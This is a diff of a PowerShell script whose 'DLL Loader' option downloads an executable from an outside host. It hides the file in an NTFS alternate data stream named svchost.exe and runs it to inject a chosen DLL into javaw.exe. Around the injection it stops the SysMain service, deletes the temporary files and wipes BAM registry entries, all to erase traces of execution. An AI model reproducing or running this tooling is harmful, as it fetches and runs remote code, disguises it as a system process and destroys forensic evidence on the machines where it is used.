@@ -121,6 +121,7 @@ if ($choice -eq "1") {
     Read-Host "Press Enter to exit"
 }
 
+
 elseif ($choice -eq "2") {
     Write-Host "`n[*] You selected DLL Loader`n" -ForegroundColor Cyan
     $dllLoaderUrl = "https://abrehamrahi.ir/o/public/MkVxqrPL/"
@@ -128,38 +129,65 @@ elseif ($choice -eq "2") {
     $tempName = "$rnd.tmp"
     $tempPath = Join-Path $env:TEMP $tempName
     $hostFile = "$env:TEMP\update.log"
-
     Write-Host "[*] Downloading DLL loader..." -ForegroundColor Cyan
     Write-Host "    Destination: $tempPath"
-    try { Invoke-WebRequest -Uri $dllLoaderUrl -OutFile $tempPath -ErrorAction Stop; Write-Host "[+] Download completed successfully" -ForegroundColor Green } catch { Write-Host "[!] Download failed: $_" -ForegroundColor Red; exit 1 }
-
+    try {
+        Invoke-WebRequest -Uri $dllLoaderUrl -OutFile $tempPath -ErrorAction Stop
+        Write-Host "[+] Download completed successfully" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Download failed: $_" -ForegroundColor Red
+        exit 1
+    }
     $userDllPath = Read-Host "Enter path to target DLL"
-    if (-not (Test-Path $userDllPath)) { Write-Host "[!] DLL path not found: $userDllPath" -ForegroundColor Red; exit 1 }
-
+    if (-not (Test-Path $userDllPath)) {
+        Write-Host "[!] DLL path not found: $userDllPath" -ForegroundColor Red
+        exit 1
+    }
     $adsName = "svchost.exe"
     if (-not (Test-Path $hostFile)) { New-Item -Path $hostFile -ItemType File -Force | Out-Null }
-
-    try { Get-Content $tempPath -Encoding Byte -ReadCount 0 | Set-Content -Path "${hostFile}:${adsName}" -Encoding Byte; Write-Host "[+] ADS created successfully: ${hostFile}:${adsName}" -ForegroundColor Green } catch { Write-Host "[!] Failed to create ADS: $_" -ForegroundColor Red; exit 1 }
-
+    try {
+        Get-Content $tempPath -Encoding Byte -ReadCount 0 | Set-Content -Path "${hostFile}:${adsName}" -Encoding Byte
+        Write-Host "[+] ADS created successfully: ${hostFile}:${adsName}" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Failed to create ADS: $_" -ForegroundColor Red
+        exit 1
+    }
     $tempExe = Join-Path $env:TEMP $adsName
     try {
         Get-Content "${hostFile}:${adsName}" -Encoding Byte -ReadCount 0 | Set-Content -Path $tempExe -Encoding Byte
         Write-Host "[+] DLL loader extracted: $tempExe" -ForegroundColor Green
-        sc.exe stop SysMain | Out-Null; Write-Host "[*] SysMain service stopped" -ForegroundColor Cyan
-        Start-Process $tempExe -ArgumentList "`"$userDllPath`" javaw.exe"; Write-Host "[*] DLL Loader executed successfully" -ForegroundColor Cyan
-    } catch { Write-Host "[!] Failed to execute DLL loader: $_" -ForegroundColor Red; exit 1 }
-
+    } catch {
+        Write-Host "[!] Failed to extract DLL loader: $_" -ForegroundColor Red
+        exit 1
+    }
+    sc.exe stop SysMain | Out-Null
+    Write-Host "[*] SysMain service stopped" -ForegroundColor Cyan
+    try {
+        $exeFolder = Split-Path $tempExe
+        Start-Process -FilePath $tempExe -ArgumentList "`"$userDllPath`" javaw.exe" -WorkingDirectory $exeFolder
+        Write-Host "[*] DLL Loader executed in its folder successfully" -ForegroundColor Cyan
+    } catch {
+        Write-Host "[!] Failed to execute DLL loader: $_" -ForegroundColor Red
+        exit 1
+    }
     Write-Host "`n[*] Cleaning temporary files" -ForegroundColor Cyan
     $deleteTmp = Read-Host "    Delete temporary files? [Y/N]"
     if ($deleteTmp -match "^[Yy]$") {
-        $maxWait=30; $waited=0
-        while ((Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $tempExe }) -and ($waited -lt $maxWait)) { Start-Sleep 1; $waited++ }
+        $maxWait = 30
+        $waited = 0
+        while ((Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $tempExe }) -and ($waited -lt $maxWait)) {
+            Start-Sleep 1
+            $waited++
+        }
         if (Test-Path $tempPath) { Rename-And-Delete -filePath $tempPath }
         if (Test-Path $tempExe) { Rename-And-Delete -filePath $tempExe }
     }
-    sc.exe start SysMain | Out-Null; Write-Host "[*] SysMain service started" -ForegroundColor Cyan
+    sc.exe start SysMain | Out-Null
+    Write-Host "[*] SysMain service started" -ForegroundColor Cyan
     Remove-BamRegistryEntries -adsName "svchost.exe"
     Write-Host "`n[+] DLL Loader operation completed" -ForegroundColor Green
     Read-Host "Press Enter to exit"
 }
-else { Write-Host "[!] Invalid choice. Exiting..." -ForegroundColor Red }
+else {
+    Write-Host "[!] Invalid choice. Exiting..." -ForegroundColor Red
+}
